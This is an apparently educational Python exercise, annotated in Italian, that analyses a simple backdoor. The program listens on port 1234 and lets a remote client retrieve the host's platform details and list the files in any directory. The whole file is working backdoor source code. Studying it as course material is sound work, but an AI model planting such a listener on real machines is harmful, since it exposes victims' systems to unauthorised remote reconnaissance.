"""
Analisi
Il programma fa da backdoor in un computer dove viene avviato, sta in ascolta su tutte le interfacce di rete e sulla port 1234, a connessione stabilita da un client remoto 
si possono ottenere varie informazioni sul computer host inviando messaggi come 1 per avere informazioni sulla macchina della vittima 
o 2 che specificando poi un percorso possiamo ottenere una lista di tutti i file/directory presenti
con lo 0 si chiude la connessione

Considerazioni
Il programma mancava di .strip() dopo le decodifica dei dati, per prevenire eventuali \n o altri caretteri buffer presenti nel messaggio 
"""



import socket, platform, os #importa i moduli socket, per le funzionalità di rete, platform, per ottenere informazioni sull piattaforma in uso, e os per interagire col sistema operativo

#imposta ip e porta di rete su cui stare in ascolto
SRV_ADDR = "" #lasciando vuoto il socket sarà in ascolto su tutte le interfacce disponibili
SRV_PORT = 1234

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) #crea un oggetto socket tcp ipv4
s.bind((SRV_ADDR,SRV_PORT)) #associa il socket a l'indirizzo e porta decisi
s.listen(1) #Permette al server di accettare connessioni, specifica che ne accetterà 1 prima di cominciare a rifiutare
connection, address = s.accept() #accetta la connessione e ritorna un oggetto socket, per poter comunicare sulla connessione effettuata, e l'indirizzo del client che si è connesso 

print ("Client connected: ", address) #stampa l'indirizzo del client che si è connesso

while True:
    try:
        data = connection.recv(1024) #prova a ricevere dati dalla connessione con un massimo di 1024 bytes
        print(data.decode('utf-8'))
    except:continue #nel caso ci siano problemi nella ricezione il programma continua comunque

    #decodifica i dati inviati e:
    if(data.decode('utf-8').strip()=="1"): #se il messaggio corrisponde a 1
        tosend=platform.platform() + " " + platform.machine() #prepara il messaggio di risposta con le specifiche del computer in utlizzo
        connection.sendall(tosend.encode()) #invia il messaggio al client connesso
    elif(data.decode('utf-8').strip()=="2"): #se il messaggio corrisponde a 2
        data = connection.recv(1024) #legge altri dati inviati dal client, in questo caso si aspetta il path alla directory interessata
        try:
            filelist= os.listdir(data.decode('utf-8').strip()) #crea una lista di tutti i file e directory presenti nel path inviato dal client
            tosend= "" 
            for x in filelist: #per ogni elemento della lista va ad aggiungere ad una stringa il suo nome
                tosend += "," + x
        except:
            tosend="Wrong path" #nel caso ci siano problemi nella lettura della directory ritorna come messaggio Wrong path
        connection.sendall(tosend.encode()) #invia il messsaggio al client
    elif(data.decode('utf-8')).strip()=="0": #se il messaggio inviato corrisponde a 0
        connection.close() #chiude la connessione
        connection, address = s.accept() #rimane in attesa di una nuova connessione